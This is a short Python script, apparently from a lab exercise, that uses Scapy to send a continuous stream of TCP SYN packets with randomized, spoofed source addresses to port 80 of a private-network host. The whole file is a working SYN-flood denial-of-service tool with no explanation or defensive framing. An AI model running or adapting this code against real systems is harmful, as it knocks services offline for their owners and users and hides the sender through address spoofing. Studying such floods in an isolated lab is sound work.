from scapy.all import *
from random import getrandbits

target_ip = "10.0.2.15"
target_port = 80

ip = IP(src=RandIP("10.0.2.15/24"), dst=target_ip)

tcp = TCP(sport=RandShort(), dport=target_port, flags="S", seq=100)

raw = Raw(b"Test")
p = ip / tcp / raw
srloop(p,verbose=0,inter=0.03)